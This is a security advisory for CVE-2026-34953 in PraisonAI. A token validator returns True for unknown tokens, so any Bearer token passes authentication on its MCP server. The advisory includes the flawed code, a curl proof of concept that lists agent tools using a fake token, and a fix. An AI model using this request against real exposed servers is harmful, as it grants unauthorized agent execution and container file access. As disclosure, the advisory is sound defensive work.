# [C] PraisonAI Has Authentication Bypass via OAuthManager.validate_token()

## Summary
Severity: Critical
Advisory: GHSA-98f9-fqg5-hvq5
CVE: CVE-2026-34953
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-98f9-fqg5-hvq5
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.97

## Details
### Summary

`OAuthManager.validate_token()` returns `True` for any token not found in its internal store, which is empty by default. Any HTTP request to the MCP server with an arbitrary Bearer token is treated as authenticated, granting full access to all registered tools and agent capabilities.

### Details

`oauth.py:364` (source) -> `oauth.py:374` (loop miss) -> `oauth.py:381` (sink)
```python
# source
def validate_token(self, token: str) -> bool:
    for stored_token in self._tokens.values():
        if stored_token.access_token == token:
            return not stored_token.is_expired()

# sink -- _tokens is empty by default, loop never executes, falls through
    return True
```

### PoC
```bash
# install: pip install -e src/praisonai
# start server: praisonai mcp serve --transport http-stream --port 8080

curl -s -X POST http://127.0.0.1:8080/mcp \
  -H "Authorization: Bearer fake_token_abc123" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'

# expected output: 200 OK with full tool list (50+ tools)
# including praisonai.agent.run, praisonai.workflow.run, praisonai.containers.file_write
```

### Impact

Any unauthenticated attacker with network access to the MCP HTTP server can call all registered tools including agent execution, workflow runs, container file read/write, and skill loading. The server binds to `0.0.0.0` by default with no API key required.

### Suggested Fix
```python
def validate_token(self, token: str) -> bool:
    for stored_token in self._tokens.values():
        if stored_token.access_token == token:
            return not stored_token.is_expired()
    # Unknown tokens must be rejected.
    # For external/JWT tokens, call the introspection endpoint here before returning.
    return False
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-98f9-fqg5-hvq5
- https://nvd.nist.gov/vuln/detail/CVE-2026-34953
- https://github.com/MervinPraison/PraisonAI
